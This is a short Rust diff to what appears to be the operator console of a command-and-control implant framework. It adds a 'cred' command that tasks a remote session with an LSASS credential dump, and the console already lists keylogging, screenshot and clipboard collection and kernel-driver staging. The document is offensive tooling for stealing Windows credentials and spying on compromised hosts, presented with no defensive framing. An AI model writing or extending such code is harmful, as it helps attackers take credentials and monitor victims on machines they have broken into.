@@ -137,6 +137,9 @@ impl App {
                     "  collect <id> <screenshot|clipboard|keylog>      collection (T031)".into(),
                 );
                 self.push_log(
+                    "  cred <id> <user|kernel>                        LSASS dump (T032/T033; download the returned path)".into(),
+                );
+                self.push_log(
                     "  driver <id> load <svc> <src> <dst>   stage+start kernel driver (ABR-T013)"
                         .into(),
                 );
@@ -213,6 +216,12 @@ impl App {
                 // collect <id> <screenshot|clipboard|keylog>
                 let id: u32 = tokens[1].parse().unwrap_or(0);
                 Some(json!({ "cmd": "collect", "session": id, "action": tokens[2] }))
+            }
+            Some("cred") if tokens.len() >= 3 => {
+                // cred <id> <user|kernel> — LSASS dump; the result is a
+                // temp path, fetch it with download
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                Some(json!({ "cmd": "cred", "session": id, "action": tokens[2] }))
             }
             Some("psrun") if tokens.len() >= 3 => {
                 let id: u32 = tokens[1].parse().unwrap_or(0);
